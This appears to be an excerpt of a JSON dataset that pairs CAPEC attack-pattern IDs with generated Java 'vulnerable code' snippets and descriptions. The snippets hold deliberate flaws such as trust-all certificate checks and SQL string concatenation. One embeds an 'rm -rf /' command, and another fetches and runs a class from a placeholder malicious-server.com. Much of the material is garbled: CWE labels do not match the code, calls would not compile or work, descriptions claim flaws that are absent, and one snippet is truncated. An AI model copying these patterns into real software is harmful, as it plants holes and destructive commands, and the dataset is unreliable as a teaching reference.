        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            DataInputStream input = new DataInputStream(socket.getInputStream());\n            DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            // No verification of the identity of the actor at the other end of the channel\n            String request = input.readUTF();\n            if (request.equals(\"getSensitiveData\")) {\n                // CWE-940: Improper Verification of Source of a Communication Channel\n                // No proper verification of the origin of the request\n                output.writeUTF(\"Here is the sensitive data: <data>\");\n            }\n\n            // CWE-654: Reliance on a Single Factor in a Security Decision\n            // Relying solely on the request string to make a security decision\n            if (request.equals(\"performAction\")) {\n                // CWE-222: Truncation of Security-relevant Information\n                // Truncating the display of security-relevant information\n                System.out.println(\"Performing action...\");\n                performAction();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void performAction() {\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // Simple authentication protocol vulnerable to reflection attacks\n        // Impersonating a trusted user to perform an action\n        System.out.println(\"Impersonating a trusted user to perform an action...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of impersonating a person of authority to motivate the target to reveal sensitive information or take a specific action. The code establishes a communication channel without verifying the identity of the actor at the other end (CWE-300), improperly verifies the source of the communication channel (CWE-940), relies on a single factor in a security decision (CWE-654), truncates security-relevant information (CWE-222), and is vulnerable to reflection attacks in an authentication protocol (CWE-301)."
    },
    {
        "capec_id": "422",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SocialEngineeringServlet extends HttpServlet {\n    private int requestCount = 0;\n    private String origin = \"expected-origin\";\n\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String requestOrigin = req.getHeader(\"Origin\");\n        if (requestOrigin != null && requestOrigin.equals(origin)) {\n            // No proper verification of source of communication channel (CWE-940)\n            // Increment request count without limiting the frequency of interactions (CWE-799)\n            requestCount++;\n            if (requestCount < 5) {\n                // Perform minor tasks\n                PrintWriter writer = resp.getWriter();\n                writer.println(\"Performing minor task...\");\n            } else {\n                // After complying with minor tasks, agree to subsequent requests\n                // that are similar in type and required effort (CAPEC)\n                PrintWriter writer = resp.getWriter();\n                writer.println(\"Performing major task...\");\n            }\n        } else {\n            // Observable behavioral discrepancy (CWE-205)\n            PrintWriter writer = resp.getWriter();\n            writer.println(\"Invalid request origin.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to social engineering attacks. It increments a request count without limiting the frequency of interactions, and performs minor tasks initially. After a certain number of requests, it agrees to perform a major task, similar in type and required effort. The code also lacks proper verification of the source of the communication channel, and exhibits observable behavioral discrepancies."
    },
    {
        "capec_id": "423",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n        this.isAdmin = false;\n    }\n\n    public boolean authenticate() {\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            isAdmin = true;\n            return true;\n        }\n\n        // CWE-205: Observable Behavioral Discrepancy\n        // CWE-656: Reliance on Security Through Obscurity\n        if (username.equals(\"guest\") && password.equals(hashPassword(\"password\"))) {\n            isAdmin = false;\n            return true;\n        }\n\n        return false;\n    }\n\n    private String hashPassword(String password) {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        Intent intent = new Intent(\"com.example.HASH_PASSWORD\");\n        intent.putExtra(\"password\", password);\n        sendBroadcast(intent);\n        return \"hashed_password\";\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol that embodies the CAPEC of building a relationship with the target to influence their actions. The code has multiple security flaws, including a reflection attack in the authentication protocol (CWE-301), reliance on a single factor in a security decision (CWE-654), observable behavioral discrepancy (CWE-205), reliance on security through obscurity (CWE-656), and use of implicit intent for sensitive communication (CWE-927)."
    },
    {
        "capec_id": "424",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n        this.isAdmin = false;\n    }\n\n    public boolean authenticate() {\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            isAdmin = true;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public void performAction() {\n        if (isAdmin) {\n            System.out.println(\"Performing admin action...\");\n        } else {\n            System.out.println(\"Performing user action...\");\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationProtocol ap = new AuthenticationProtocol(\"user\", \"password\");\n        if (ap.authenticate()) {\n            ap.performAction();\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol that relies on a single factor (username and password) to make a security decision (CWE-654). The protocol is also susceptible to reflection attacks (CWE-301) and observable behavioral discrepancies (CWE-203, CWE-205, CWE-207) that can be exploited by an adversary to influence the target's actions. The code allows an attacker to impersonate an admin user by simply using the correct username and password, and the observable difference in behavior between admin and user actions can be used to reveal the internal state of the system."
    },
    {
        "capec_id": "425",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSession;\n\npublic class FramingAttack {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"https://example.com/login\");\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            @Override\n            public boolean verify(String hostname, SSLSession session) {\n                // CWE-941: Incorrectly Specified Destination in a Communication Channel\n                // CWE-300: Channel Accessible by Non-Endpoint\n                return true; // Always trust the connection\n            }\n        });\n        connection.connect();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n            // CWE-654: Reliance on a Single Factor in a Security Decision\n            // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n            System.out.println(line);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a framing attack, where an adversary uses persuasive techniques to influence the target's decisions. The code establishes a connection to a URL, ignoring hostname verification and trusting the connection. It then reads and prints the response, potentially misrepresenting critical information to the user. The code relies on a single factor for security decisions and uses a less-secure algorithm for negotiation, making it vulnerable to attacks."
    },
    {
        "capec_id": "426",
        "code_snippet": "public class Incentivizer {\n    private String targetMorals;\n    private int resourceThreshold;\n    private String communicationChannel;\n    private String obscureKey;\n    private boolean accessGranted;\n\n    public Incentivizer(String targetMorals, int resourceThreshold, String communicationChannel, String obscureKey) {\n        this.targetMorals = targetMorals;\n        this.resourceThreshold = resourceThreshold;\n        this.communicationChannel = communicationChannel;\n        this.obscureKey = obscureKey;\n    }\n\n    public void manipulateTarget() {\n        // CWE-1229: Creation of Emergent Resource\n        for (int i = 0; i < resourceThreshold; i++) {\n            createResource();\n        }\n\n        // CWE-405: Asymmetric Resource Consumption (Amplification)\n        consumeExcessiveResources();\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        initiateOutgoingRequest(communicationChannel);\n\n        // CWE-656: Reliance on Security Through Obscurity\n        if (obscureKey.equals(\"secretKey\")) {\n            accessGranted = true;\n        }\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (accessGranted) {\n            grantAccessToRestrictedResources();\n        }\n    }\n\n    private void createResource() {\n        // Create a new resource that can be used by attackers\n    }\n\n    private void consumeExcessiveResources() {\n        // Consume excessive resources without requiring equivalent work\n    }\n\n    private void initiateOutgoingRequest(String channel) {\n        // Initiate an outgoing request to an actor without correctly specifying the intended destination\n    }\n\n    private void grantAccessToRestrictedResources() {\n        // Grant access to restricted resources based on a single condition\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating a target's behavior through incentivization, incorporating CWEs 1229, 405, 941, 656, and 654. The Incentivizer class takes in the target's morals, resource threshold, communication channel, and obscure key as parameters. The manipulateTarget method creates emergent resources, consumes excessive resources, initiates an outgoing request with an incorrectly specified destination, relies on security through obscurity, and grants access to restricted resources based on a single condition. This code snippet illustrates how an adversary can exploit these vulnerabilities to manipulate the target's behavior."
    },
    {
        "capec_id": "427",
        "code_snippet": "public class InfluencedBehavior {\n    private String userRole;\n    private String authenticationToken;\n    \n    public InfluencedBehavior(String userRole) {\n        this.userRole = userRole;\n    }\n    \n    public boolean authenticate(String token) {\n        if (token.equals(authenticationToken)) {\n            return true;\n        } else {\n            // Truncation of security-relevant information (CWE-222)\n            String truncatedToken = token.substring(0, 5);\n            if (truncatedToken.equals(authenticationToken.substring(0, 5))) {\n                return true;\n            }\n        }\n        return false;\n    }\n    \n    public void grantAccess(String resource) {\n        if (userRole.equals(\"admin\")) {\n            // Reliance on a single factor in a security decision (CWE-654)\n            if (resource.equals(\"adminPanel\")) {\n                return;\n            }\n        }\n        // External influence of sphere definition (CWE-673)\n        String sphereDefinition = getSphereDefinitionFromExternalSource();\n        if (sphereDefinition.equals(\"allow\")) {\n            return;\n        }\n        throw new SecurityException(\"Access denied\");\n    }\n    \n    private String getSphereDefinitionFromExternalSource() {\n        // Observable behavioral discrepancy (CWE-205)\n        String userAgent = getUserAgentFromRequestHeader();\n        if (userAgent.contains(\"Chrome\")) {\n            return \"allow\";\n        } else {\n            return \"deny\";\n        }\n    }\n    \n    private String getUserAgentFromRequestHeader() {\n        // Reflection attack in an authentication protocol (CWE-301)\n        String userAgent = getRequestHeader(\"User-Agent\");\n        return userAgent;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable system that can be influenced by an adversary through various psychological and social cues. The system authenticates users based on a truncated token, relies on a single factor for security decisions, and allows external influence of control spheres. It also exhibits observable behavioral discrepancies based on user agent headers and is susceptible to reflection attacks in its authentication protocol."
    },
    {
        "capec_id": "428",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetAddress;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the identity of the actor at the other end of the channel\n        String message = dis.readUTF();\n        System.out.println(\"Received message: \" + message);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the origin of the request\n        dos.writeUTF(\"Hello from the other side!\");\n\n        // CWE-1229: Creation of Emergent Resource\n        // Creation of a new resource (socket) without proper access control\n        Socket newSocket = new Socket(InetAddress.getByName(\"localhost\"), 8081);\n        DataOutputStream newDos = new DataOutputStream(newSocket.getOutputStream());\n        newDos.writeUTF(\"New socket created!\");\n\n        // CWE-222: Truncation of Security-relevant Information\n        // Truncation of security-relevant information (e.g., logging only partial information)\n        System.out.println(\"Connection established...\" + socket.getInetAddress().getHostName());\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // Simple authentication protocol vulnerable to reflection attacks\n        String authenticationToken = dis.readUTF();\n        if (authenticationToken.equals(\"secretToken\")) {\n            System.out.println(\"Authenticated!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that can be exploited by an adversary to build rapport with the target and manipulate them into sharing information. The code lacks proper verification of the identity of actors at both ends of the communication channel, allowing an attacker to access or influence the channel. Additionally, the code creates a new resource (socket) without proper access control, truncates security-relevant information, and uses a simple authentication protocol vulnerable to reflection attacks."
    },
    {
        "capec_id": "429",
        "code_snippet": "import java.util.Scanner;\nimport java.util.Random;\n\npublic class EyeMovementCAPTCHA {\n    private static final String[] EYE_MOVEMENT_PATTERNS = {\"left-right\", \"right-left\", \"up-down\", \"down-up\"};\n    private static final int MAX_ATTEMPTS = 3;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        Random random = new Random();\n        int attempts = 0;\n\n        while (attempts < MAX_ATTEMPTS) {\n            String eyeMovementPattern = getEyeMovementPattern(random);\n            System.out.println(\"Please follow the eye movement pattern: \" + eyeMovementPattern);\n            String userResponse = scanner.nextLine();\n\n            if (userResponse.equals(eyeMovementPattern)) {\n                System.out.println(\"Access granted!\");\n                return;\n            } else {\n                attempts++;\n                System.out.println(\"Incorrect. Attempts remaining: \" + (MAX_ATTEMPTS - attempts));\n            }\n        }\n\n        System.out.println(\"Access denied.\");\n    }\n\n    private static String getEyeMovementPattern(Random random) {\n        return EYE_MOVEMENT_PATTERNS[random.nextInt(EYE_MOVEMENT_PATTERNS.length)];\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable CAPTCHA system that uses eye movement patterns to verify user identity. The system displays a randomly selected eye movement pattern and asks the user to follow it. However, the system truncates the display of security-relevant information (CWE-222) by not providing clear instructions on how to respond correctly. Additionally, the system's behavior is observable and can be guessed by an unauthorized actor (CWE-203), making it vulnerable to automated attacks. The system also misrepresents critical information to the user (CWE-451) by not providing feedback on the correctness of their response. Furthermore, the CAPTCHA challenge can be easily guessed or recognized by a non-human actor (CWE-804), making it an ineffective security measure."
    },
    {
        "capec_id": "430",
        "code_snippet": "public class VulnerableCode {\n    private static final Logger LOGGER = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // CWE-534: Information Exposure Through Debug Log Files\n            LOGGER.setLevel(Level.ALL);\n            LOGGER.info(\"Debug information: \" + sensitiveData);\n\n            // CWE-533: Information Exposure Through Server Log Files\n            ServerLogger.log(\"Server log information: \" + sensitiveData);\n\n            // CWE-1420: Exposure of Sensitive Information during Transient Execution\n            int[] array = new int[10];\n            for (int i = 0; i < array.length; i++) {\n                array[i] = sensitiveData;\n            }\n            // Speculative execution may expose sensitive data\n            int x = array[10];\n\n            // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n            // Microarchitectural state may still hold sensitive data\n            int y = array[10];\n        } catch (Exception e) {\n            // CWE-1125: Excessive Attack Surface\n            // Excessive logging may expose sensitive information\n            LOGGER.severe(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String sensitiveData = \"confidential information\";\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern, which has been deprecated. It includes various CWEs, such as CWE-534 and CWE-533, which involve information exposure through debug and server log files. CWE-1420 is also represented, showcasing exposure of sensitive information during transient execution. Additionally, CWE-1342 is demonstrated, highlighting information exposure through microarchitectural state after transient execution. Finally, CWE-1125 is exemplified, with excessive logging potentially exposing sensitive information."
    },
    {
        "capec_id": "431",
        "code_snippet": "public class VulnerableCode {\n    public static void processUserInput(String userInput) {\n        try {\n            // CWE-1286: No validation of syntactic correctness of input\n            String[] parts = userInput.split(\"=\");\n            if (parts.length != 2) {\n                throw new Exception(\"Invalid input\");\n            }\n            String key = parts[0];\n            String value = parts[1];\n            // CWE-81: Improper neutralization of script in an error message web page\n            if (value.contains(\"<\") || value.contains(\">\")) {\n                throw new Exception(\"Invalid character in input: \" + value);\n            }\n            // CWE-1125: Excessive attack surface - using a template engine with unvalidated input\n            String template = \"Hello, {{\" + key + \"}}!\";\n            // CWE-1336: Improper neutralization of special elements used in a template engine\n            String result = new TemplateEngine().render(template, value);\n            System.out.println(result);\n        } catch (Exception e) {\n            // CWE-209: Generation of error message containing sensitive information\n            System.out.println(\"Error: \" + e.getMessage() + \" - Stack trace: \" + e.getStackTrace());\n        }\n    }\n\n    public static void main(String[] args) {\n        processUserInput(\"name=John\" + \"<script>alert('XSS')</script>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the deprecated CAPEC attack pattern. It receives user input, but does not validate its syntactic correctness, leading to potential errors. The code also improperly neutralizes script in an error message web page, has an excessive attack surface due to the use of a template engine with unvalidated input, and generates error messages containing sensitive information. The code is vulnerable to XSS attacks and information disclosure."
    },
    {
        "capec_id": "432",
        "code_snippet": "import java.util.Scanner;\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String input = scanner.nextLine();\n        String query = \"SELECT * FROM users WHERE name = '\" + input + \"';\";\n        System.out.println(\"Query: \" + query);\n        // Execute the query\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of improper neutralization of quoting syntax. The code takes user input and injects it into a SQL query without proper validation or sanitization, making it vulnerable to SQL injection attacks. The CWEs related to this pattern include CWE-149: Improper Neutralization of Quoting Syntax, CWE-1286: Improper Validation of Syntactic Correctness of Input, and CWE-532: Information Exposure Through Log Files (related to CWE-534 and CWE-533)."
    },
    {
        "capec_id": "433",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class HumanBufferOverflow {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = dis.readUTF();\n        // No message integrity check performed\n\n        // CWE-806: Buffer Access Using Size of Source Buffer\n        byte[] buffer = message.getBytes();\n        byte[] destinationBuffer = new byte[buffer.length];\n        System.arraycopy(buffer, 0, destinationBuffer, 0, buffer.length);\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        for (int i = 0; i < buffer.length + 10; i++) {\n            destinationBuffer[i] = buffer[i];\n        }\n\n        // CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        byte[] overflowBuffer = new byte[10];\n        System.arraycopy(destinationBuffer, 0, overflowBuffer, 0, destinationBuffer.length);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        dos.writeUTF(new String(overflowBuffer));\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of Human Buffer Overflow by exploiting various CWEs. It establishes a socket connection and receives a message without verifying its integrity. Then, it performs buffer operations without proper bounds checking, leading to potential buffer overflows. Finally, it transmits sensitive information in cleartext, making it vulnerable to sniffing attacks."
    },
    {
        "capec_id": "434",
        "code_snippet": "public class SensitiveInformationExposure {\n    private static final String DB_USERNAME = \"admin\";\n    private static final String DB_PASSWORD = \"password\";\n    private static final String DB_QUERY = \"SELECT * FROM users WHERE username = ? AND password = ?\";\n\n    public static void main(String[] args) {\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", DB_USERNAME, DB_PASSWORD);\n            PreparedStatement pstmt = conn.prepareStatement(DB_QUERY);\n            pstmt.setString(1, \"john\");\n            pstmt.setString(2, \"password123\");\n            ResultSet result = pstmt.executeQuery();\n\n            // Insecurely print query statistics\n            System.out.println(\"Query executed in \" + pstmt.getExecutionTime() + \" milliseconds\");\n            System.out.println(\"Number of rows affected: \" + pstmt.getUpdateCount());\n\n            // Observable behavioral discrepancy: different query execution times for different users\n            if (result.next()) {\n                System.out.println(\"User found!\");\n            } else {\n                System.out.println(\"User not found.\");\n            }\n\n            // Incompatible policies: exposing information to unauthorized actors\n            String userRole = result.getString(\"role\");\n            if (userRole.equals(\"admin\")) {\n                System.out.println(\"Admin user detected.\");\n            } else {\n                System.out.println(\"Regular user detected.\");\n            }\n\n            // Guessable CAPTCHA: weak CAPTCHA implementation\n            String captchaChallenge = \"What is 2 + 2?\";\n            String userResponse = \"4\";\n            if (userResponse.equals(\"4\")) {\n                System.out.println(\"CAPTCHA passed.\");\n            } else {\n                System.out.println(\"CAPTCHA failed.\");\n            }\n\n            // Missing source correlation: relying on a single data source\n            String userData = result.getString(\"data\");\n            System.out.println(\"User data: \" + userData);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC 'Exposure of Sensitive Information Through Data Queries' by showcasing multiple CWEs. It exposes sensitive information through query statistics, observable behavioral discrepancies, and incompatible policies. Additionally, it includes a weak CAPTCHA implementation and relies on a single data source, making it vulnerable to attacks."
    },
    {
        "capec_id": "435",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: No verification of the identity of the actor at the other end of the channel\n        String request = in.readUTF();\n        if (request.equals(\"GET_DATA\")) {\n            // CWE-941: Incorrectly specified destination in the communication channel\n            out.writeUTF(\"Sending data to unknown destination...\");\n            out.writeUTF(\"Data: \" + getData());\n        } else {\n            // CWE-940: Improper verification of the source of the communication channel\n            out.writeUTF(\"Unknown request from unknown source...\");\n        }\n    }\n\n    private static String getData() {\n        // CWE-673: External influence of sphere definition\n        String data = \"\";\n        try {\n            // CWE-205: Observable behavioral discrepancy\n            if (System.getProperty(\"os.name\").equals(\"Windows\")) {\n                data = \"Windows data\";\n            } else {\n                data = \"Linux data\";\n            }\n        } catch (Exception e) {\n            data = \"Error: \" + e.getMessage();\n        }\n        return data;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-300 Channel Accessible by Non-Endpoint vulnerability. The server establishes a communication channel without verifying the identity of the actor at the other end, allowing unauthorized access. The server also incorrectly specifies the destination of the communication channel and improperly verifies the source of the incoming request. Additionally, the code allows external influence of sphere definition and exhibits observable behavioral discrepancies based on the operating system."
    },
    {
        "capec_id": "438",
        "code_snippet": "public class MaliciousHardwareDevice {\n    private static final String CONFIDENTIAL_INFO = \"top_secret_data\";\n    private static final String UNTRUSTED_COMPONENT = \"com.untrusted.vendor.Component\";\n\n    public MaliciousHardwareDevice() {\n        // Use untrusted component without proper validation\n        try {\n            Class<?> untrustedClass = Class.forName(UNTRUSTED_COMPONENT);\n            Object untrustedInstance = untrustedClass.newInstance();\n            // Use the untrusted component without proper security checks\n            untrustedInstance.toString();\n        } catch (Exception e) {\n            // Ignore any exceptions\n        }\n    }\n\n    public void releaseToDevice() {\n        // Release device in non-release configuration\n        System.setProperty(\"debug.mode\", \"true\");\n        // Store confidential information in plaintext\n        File confidentialFile = new File(\"confidential_data.txt\");\n        try (FileWriter writer = new FileWriter(confidentialFile)) {\n            writer.write(CONFIDENTIAL_INFO);\n        } catch (IOException e) {\n            // Ignore any exceptions\n        }\n    }\n\n    public static void main(String[] args) {\n        MaliciousHardwareDevice device = new MaliciousHardwareDevice();\n        device.releaseToDevice();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious hardware device that embodies the CAPEC. It uses an untrusted component without proper validation (CWE-1357), stores confidential information in plaintext and accessible by OSAT vendors (CWE-1297), releases the device in a non-release configuration (CWE-1269), and lacks sufficient technical documentation (CWE-1059). The device also contains a component that cannot be updated or patched (CWE-1329)."
    },
    {
        "capec_id": "439",
        "code_snippet": "public class VulnerableProduct {\n    private String sensitiveInfo = \"topSecret\";\n    private ThirdPartyComponent vulnerableComponent;\n    private boolean isReleaseConfig = false;\n\n    public VulnerableProduct() {\n        vulnerableComponent = new ThirdPartyComponent(\"1.0.0\");\n    }\n\n    public void doSomething() {\n        if (!isReleaseConfig) {\n            System.out.println(\"Debug mode: \" + sensitiveInfo);\n        }\n        vulnerableComponent.execute();\n    }\n\n    public static void main(String[] args) {\n        VulnerableProduct product = new VulnerableProduct();\n        product.doSomething();\n    }\n}\n\nclass ThirdPartyComponent {\n    private String version;\n\n    public ThirdPartyComponent(String version) {\n        this.version = version;\n    }\n\n    public void execute() {\n        if (version.equals(\"1.0.0\")) {\n            System.out.println(\"Executing vulnerable code...\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. The code contains multiple CWEs: CWE-1269 (Product Released in Non-Release Configuration) as the product is released in debug mode, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as sensitive information is exposed, CWE-1395 (Dependency on Vulnerable Third-Party Component) as the product uses a vulnerable third-party component, CWE-1357 (Reliance on Insufficiently Trustworthy Component) as the component is not sufficiently trusted, and CWE-207 (Observable Behavioral Discrepancy With Equivalent Products) as the product behaves differently in debug mode."
    },
    {
        "capec_id": "440",
        "code_snippet": "public class FirmwareUpdater {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private static final String VULNERABLE_FIRMWARE_VERSION = \"0.9\";\n\n    public static void updateFirmware(String newVersion) {\n        if (newVersion.equals(VULNERABLE_FIRMWARE_VERSION)) {\n            // CWE-1328: Security Version Number Mutable to Older Versions\n            System.out.println(\"Downgrading to vulnerable firmware version...\");\n            // CWE-1329: Reliance on Component That is Not Updateable\n            HardwareComponent hc = new HardwareComponent();\n            hc.setFirmwareVersion(newVersion);\n        } else {\n            System.out.println(\"Updating to new firmware version...\");\n            // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n            VoltageGlitchDetector vgd = new VoltageGlitchDetector();\n            if (vgd.detectGlitch()) {\n                System.out.println(\"Voltage glitch detected. Aborting update.\");\n                return;\n            }\n            // CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n            HardwareLogic hl = new HardwareLogic();\n            if (hl.hasDefects()) {\n                System.out.println(\"Hardware logic defects detected. Aborting update.\");\n                return;\n            }\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            RedundancySystem rs = new RedundancySystem();\n            if (rs.isDegraded()) {\n                System.out.println(\"Redundancy system is degraded. Aborting update.\");\n                return;\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a firmware updater that can be exploited by an adversary to install a vulnerable firmware version, downgrade the security version, or inject errors into the system. The code includes vulnerabilities related to CWE-1328, CWE-1329, CWE-1247, CWE-1248, and CWE-1334, which can be exploited to compromise the system's security."
    },
    {
        "capec_id": "441",
        "code_snippet": "public class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        // Granting unrestricted access to system resources\n        System.setProperty(\"java.security.policy\", \"policy.all\");\n\n        // CWE-506: Embedded Malicious Code\n        // Executing malicious code from a seemingly benign component\n        String maliciousCode = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n        try {\n            Class<?> clazz = Class.forName(\"java.lang.Runtime\");\n            clazz.getMethod(\"getRuntime\").invoke(null).getMethod(\"exec\", String.class).invoke(null, maliciousCode);\n        } catch (Exception e) {}\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        // Spreading malware through network connections\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket socket = serverSocket.accept();\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(maliciousCode.getBytes());\n            outputStream.close();\n            socket.close();\n        } catch (IOException e) {}\n\n        // CWE-1277: Firmware Not Updateable\n        // Disabling firmware updates\n        System.setProperty(\"firmware.update\", \"false\");\n\n        // CWE-1229: Creation of Emergent Resource\n        // Creating a new resource that can be used by attackers\n        Runtime.getRuntime().exec(\"mkdir /tmp/malicious_resource\");\n    }\n}",
        "description": "A Java code snippet that demonstrates the CAPEC pattern of installing malicious logic into a seemingly benign component of a fielded system. The code includes CWE-284: Improper Access Control, CWE-506: Embedded Malicious Code, CWE-509: Replicating Malicious Code (Virus or Worm), CWE-1277: Firmware Not Updateable, and CWE-1229: Creation of Emergent Resource."
    },
    {
        "capec_id": "442",
        "code_snippet": "public class MaliciousSoftware {\n    public static void main(String[] args) {\n        // Benign functionality\n        System.out.println(\\",
        "description": "This Java code snippet demonstrates the CAPEC of adding malicious logic to benign software. The main method appears to provide normal functionality, but it also downloads and executes malicious code from a remote location without verifying its integrity (CWE-494). The malicious code is then executed using the Runtime.getRuntime().exec() method, which can lead to arbitrary code execution. This code also exhibits characteristics of a Trojan Horse (CWE-507) as it appears to be a normal software but contains hidden malicious logic. The malicious code can be a virus or worm (CWE-509) that can replicate and spread to other systems, or it can be non-replicating malicious code (CWE-508) that only resides on the target system. The code also contains embedded malicious code (CWE-506) that is hidden from the user."
    },
    {
        "capec_id": "443",
        "code_snippet": "public class MaliciousCodeInjector {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class Malicious { public static void main(String[] args) { System.out.println(\\\"Malicious code executed!\\\"); }}\";\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/malicious-code.jar\");\n            URLClassLoader urlClassLoader = new URLClassLoader(new URL[] { url });\n            Class<?> clazz = urlClassLoader.loadClass(\"Malicious\");\n            clazz.getMethod(\"main\", String[].class).invoke(null, (Object) new String[] {});\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-277: Insecure Inherited Permissions\n        File file = new File(\"malicious-file.txt\");\n        file.setReadable(true, false);\n        file.setWritable(true, false);\n        file.setExecutable(true, false);\n\n        // CWE-1229: Creation of Emergent Resource\n        Runtime.getRuntime().exec(\"touch malicious-resource.txt\");\n\n        // CWE-671: Lack of Administrator Control over Security\n        System.setProperty(\"java.security.policy\", \"file:malicious.policy\");\n    }\n}",
